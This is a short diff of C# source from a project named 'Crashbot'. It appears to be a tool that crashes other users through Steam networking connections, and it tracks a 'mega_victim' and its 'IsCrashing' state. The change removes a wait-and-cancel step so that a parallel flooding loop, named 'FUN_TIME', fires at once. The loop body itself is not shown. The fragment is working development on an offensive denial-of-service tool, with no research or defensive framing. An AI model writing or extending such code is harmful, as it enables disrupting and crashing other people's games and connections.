@@ -223,10 +223,10 @@ namespace Crashbot
                 HSteamNetConnection conn = cx.Value;
 
                 // Wait for 1 msg or 2 seconds
-                CancellationTokenSource cancellationTokenSource = new();
+                //CancellationTokenSource cancellationTokenSource = new();
 
-                Task.Run(() => SteamNetworkingSockets.ReceiveMessagesOnConnection(conn, new nint[1], 1), cancellationTokenSource.Token).ContinueWith(_ =>
-                {
+                //Task.Run(() => SteamNetworkingSockets.ReceiveMessagesOnConnection(conn, new nint[1], 1), cancellationTokenSource.Token).ContinueWith(_ =>
+                //{
                     byte[] ary = [];//new byte[int.MaxValue];
                     Parallel.For(0, FUN_TIME, (_) =>
                     {
@@ -242,9 +242,9 @@ namespace Crashbot
 
                     mega_victim.IsCrashing = false;
                     interuptSource.Completed();
-                });
+                //});
 
-                Task.Delay(5000).ContinueWith(_ => cancellationTokenSource.Cancel());
+                //Task.Delay(5000).ContinueWith(_ => cancellationTokenSource.Cancel());
             }
         }
 
